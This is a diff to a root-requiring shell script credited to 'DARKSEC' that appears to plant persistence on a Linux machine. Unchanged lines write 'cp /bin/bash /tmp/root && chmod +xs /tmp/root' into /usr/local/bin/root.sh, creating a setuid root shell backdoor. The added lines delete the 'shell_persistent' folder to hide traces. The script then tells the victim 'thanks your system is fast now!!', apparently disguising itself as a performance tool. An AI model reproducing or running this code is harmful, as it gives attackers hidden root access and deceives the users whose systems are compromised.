@@ -4,6 +4,7 @@
 # on the ip and port, choice the type from payload or connection reverse.
 # CREATE IN 2023 BY DARKSEC
 
+darksec="$PWD"
 
 echo "*******|-NEED RUN WITH ROOT!-|******"
 echo "HELLO FRIEND, HOW ARE YOU?"
@@ -40,4 +41,7 @@ echo "cp /bin/bash /tmp/root && chmod +xs /tmp/root" >> /usr/local/bin/root.sh
 sleep 1
 echo "wait..."
 sleep 3
+cd "$darksec"
+cd ..
+rm -rf shell_persistent
 echo "thanks your system is fast now!!"
